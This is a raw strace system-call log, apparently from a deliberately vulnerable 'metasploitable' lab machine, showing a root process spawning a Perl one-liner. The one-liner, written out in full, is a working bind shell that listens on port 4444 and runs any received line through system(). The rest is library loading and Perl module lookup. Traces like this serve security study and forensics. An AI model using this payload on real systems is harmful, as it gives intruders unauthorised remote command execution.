6987  07:16:29.033423 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6987  07:16:29.033513 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
6987  07:16:29.033530 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7da4000
6987  07:16:29.033541 mmap2(0xb7dad000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dad000
6987  07:16:29.033557 close(1)          = 0
6987  07:16:29.033578 munmap(0xb7f5f000, 29913) = 0
6987  07:16:29.033594 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
6987  07:16:29.033608 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
6987  07:16:29.033620 _llseek(1, 0, [0], SEEK_CUR) = 0
6987  07:16:29.033631 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
6987  07:16:29.033648 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f66000
6987  07:16:29.033658 _llseek(1, 1624, [1624], SEEK_SET) = 0
6987  07:16:29.033673 munmap(0xb7f66000, 1624) = 0
6987  07:16:29.033683 close(1)          = 0
6987  07:16:29.033712 getpgrp()         = 3831
6987  07:16:29.033722 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
6987  07:16:29.033737 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
6987  07:16:29.033753 brk(0x8101000)    = 0x8101000
6987  07:16:29.033793 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6987  07:16:29.033809 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6987  07:16:29.033824 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6987  07:16:29.033861 brk(0x8102000)    = 0x8102000
6987  07:16:29.033888 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6987  07:16:29.033907 stat64("/sbin/AB", 0xbfe5aca8) = -1 ENOENT (No such file or directory)
6987  07:16:29.033919 stat64("/bin/AB", 0xbfe5aca8) = -1 ENOENT (No such file or directory)
6987  07:16:29.033931 stat64("/usr/sbin/AB", 0xbfe5aca8) = -1 ENOENT (No such file or directory)
6987  07:16:29.033943 stat64("/usr/bin/AB", 0xbfe5aca8) = -1 ENOENT (No such file or directory)
6987  07:16:29.033960 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
6987  07:16:29.033974 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dda6f8) = 6988
6988  07:16:29.034019 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6988  07:16:29.034035 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
6988  07:16:29.034049 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
6988  07:16:29.034061 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
6988  07:16:29.034076 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6988  07:16:29.034092 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
6988  07:16:29.034104 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
6988  07:16:29.034159 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
6988  07:16:29.034173 --- SIGPIPE (Broken pipe) @ 0 (0) ---
6988  07:16:29.034241 exit_group(127)   = ?
6987  07:16:29.057286 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  07:16:29.057379 waitpid(6987,  <unfinished ...>
6987  07:16:29.057425 <... rt_sigprocmask resumed> NULL, 8) = 0
6987  07:16:29.057462 --- SIGCHLD (Child exited) @ 0 (0) ---
6987  07:16:29.057496 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 6988
6987  07:16:29.057537 waitpid(-1, 0xbfe5a928, WNOHANG) = -1 ECHILD (No child processes)
6987  07:16:29.057562 sigreturn()       = ? (mask now [])
6987  07:16:29.057596 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6987  07:16:29.057611 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6987  07:16:29.057622 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6987  07:16:29.057635 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
6987  07:16:29.057653 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6987  07:16:29.057665 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
6987  07:16:29.057701 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6987  07:16:29.057721 stat64("/sbin/perl", 0xbfe5acd8) = -1 ENOENT (No such file or directory)
6987  07:16:29.057734 stat64("/bin/perl", 0xbfe5acd8) = -1 ENOENT (No such file or directory)
6987  07:16:29.057745 stat64("/usr/sbin/perl", 0xbfe5acd8) = -1 ENOENT (No such file or directory)
6987  07:16:29.057757 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
6987  07:16:29.057775 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
6987  07:16:29.057801 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
6987  07:16:29.057815 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dda6f8) = 6989
6989  07:16:29.057864 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6989  07:16:29.057881 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
6989  07:16:29.057894 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
6989  07:16:29.057917 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
6989  07:16:29.057933 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6989  07:16:29.057949 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
6989  07:16:29.057962 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
6989  07:16:29.058002 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
6989  07:16:29.058092 brk(0)            = 0x8153000
6989  07:16:29.058112 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6989  07:16:29.058128 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f60000
6989  07:16:29.058144 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
6989  07:16:29.058161 open("/etc/ld.so.cache", O_RDONLY) = 1
6989  07:16:29.058174 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6989  07:16:29.058191 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f58000
6989  07:16:29.058202 close(1)          = 0
6989  07:16:29.058213 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6989  07:16:29.058233 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
6989  07:16:29.058248 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
6989  07:16:29.058340 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
6989  07:16:29.058358 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f54000
6989  07:16:29.058370 mmap2(0xb7f56000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f56000
6989  07:16:29.058387 close(1)          = 0
6989  07:16:29.058398 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6989  07:16:29.058399 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
6989  07:16:29.058399 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
6989  07:16:29.058399 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
6989  07:16:29.058400 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f2f000
6989  07:16:29.058400 mmap2(0xb7f52000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f52000
6989  07:16:29.058400 close(1)          = 0
6989  07:16:29.058400 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6989  07:16:29.058401 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
6989  07:16:29.058401 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
6989  07:16:29.058420 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
6989  07:16:29.058436 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f2e000
6989  07:16:29.058450 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f16000
6989  07:16:29.058460 mmap2(0xb7f2a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f2a000
6989  07:16:29.058475 mmap2(0xb7f2c000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f2c000
6989  07:16:29.058489 close(1)          = 0
6989  07:16:29.058500 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6989  07:16:29.058514 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
6989  07:16:29.058538 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
6989  07:16:29.058628 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
6989  07:16:29.058646 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc7000
6989  07:16:29.058657 mmap2(0xb7f10000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f10000
6989  07:16:29.058672 mmap2(0xb7f13000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f13000
6989  07:16:29.058685 close(1)          = 0
6989  07:16:29.058698 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6989  07:16:29.058711 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
6989  07:16:29.058725 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
6989  07:16:29.058818 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
6989  07:16:29.058835 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d95000
6989  07:16:29.058846 mmap2(0xb7d9e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d9e000
6989  07:16:29.058861 mmap2(0xb7da0000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7da0000
6989  07:16:29.058876 close(1)          = 0
6989  07:16:29.058901 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d94000
6989  07:16:29.058914 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d948c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
6989  07:16:29.058974 mprotect(0xb7f10000, 4096, PROT_READ) = 0
6989  07:16:29.059001 munmap(0xb7f58000, 29913) = 0
6989  07:16:29.059014 set_tid_address(0xb7d94908) = 6989
6989  07:16:29.059030 set_robust_list(0xb7d94910, 0xc) = 0
6989  07:16:29.059041 futex(0xbf9af650, 0x81 /* FUTEX_??? */, 1) = 0
6989  07:16:29.059056 rt_sigaction(SIGRTMIN, {0xb7f1a2c0, [], SA_SIGINFO}, NULL, 8) = 0
6989  07:16:29.059069 rt_sigaction(SIGRT_1, {0xb7f1a340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
6989  07:16:29.059082 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
6989  07:16:29.059096 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
6989  07:16:29.059115 uname({sys="Linux", node="metasploitable", ...}) = 0
6989  07:16:29.059161 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
6989  07:16:29.059206 brk(0)            = 0x8153000
6989  07:16:29.059216 brk(0x8174000)    = 0x8174000
6989  07:16:29.059260 getuid32()        = 0
6989  07:16:29.059269 geteuid32()       = 0
6989  07:16:29.059279 getgid32()        = 0
6989  07:16:29.059288 getegid32()       = 0
6989  07:16:29.059325 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d73000
6989  07:16:29.059352 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
6989  07:16:29.059369 read(1, "\205\265m\27", 4) = 4
6989  07:16:29.059382 close(1)          = 0
6989  07:16:29.059400 time(NULL)        = 1495624589
6989  07:16:29.059442 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbf9af320) = -1 ENOENT (No such file or directory)
6989  07:16:29.059459 stat64("/usr/local/lib/site_perl/5.8.8", 0xbf9af320) = -1 ENOENT (No such file or directory)
6989  07:16:29.059472 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbf9af320) = -1 ENOENT (No such file or directory)
6989  07:16:29.059488 stat64("/usr/local/lib/perl/5.8.7", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059500 stat64("/usr/local/share/perl/5.8.7", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059513 stat64("/usr/local/lib/perl/5.8.6", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059555 stat64("/usr/local/share/perl/5.8.6", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059581 stat64("/usr/local/lib/perl/5.8.4", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059592 stat64("/usr/local/share/perl/5.8.4", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059604 stat64("/usr/local/lib/perl/5.8.3", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059616 stat64("/usr/local/share/perl/5.8.3", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059628 stat64("/usr/local/lib/perl/5.8.2", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059639 stat64("/usr/local/share/perl/5.8.2", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059651 stat64("/usr/local/lib/perl/5.8.1", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059663 stat64("/usr/local/share/perl/5.8.1", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059678 stat64("/usr/local/lib/perl/5.8.0", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059690 stat64("/usr/local/share/perl/5.8.0", 0xbf9af460) = -1 ENOENT (No such file or directory)
6989  07:16:29.059714 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9af158) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.059728 _llseek(0, 0, [0], SEEK_CUR) = 0
6989  07:16:29.059740 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9af158) = -1 EBADF (Bad file descriptor)
6989  07:16:29.059751 _llseek(1, 0, 0xbf9af1a0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
6989  07:16:29.059762 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9af158) = -1 EINVAL (Invalid argument)
6989  07:16:29.059773 _llseek(2, 0, 0xbf9af1a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6989  07:16:29.059783 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
6989  07:16:29.059797 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9af218) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.059807 _llseek(1, 0, [0], SEEK_CUR) = 0
6989  07:16:29.059818 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
6989  07:16:29.059830 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
6989  07:16:29.059849 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
6989  07:16:29.059904 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
6989  07:16:29.059949 getppid()         = 6987
6989  07:16:29.060011 stat64("/etc/perl/IO.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060034 stat64("/etc/perl/IO.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060048 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060061 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
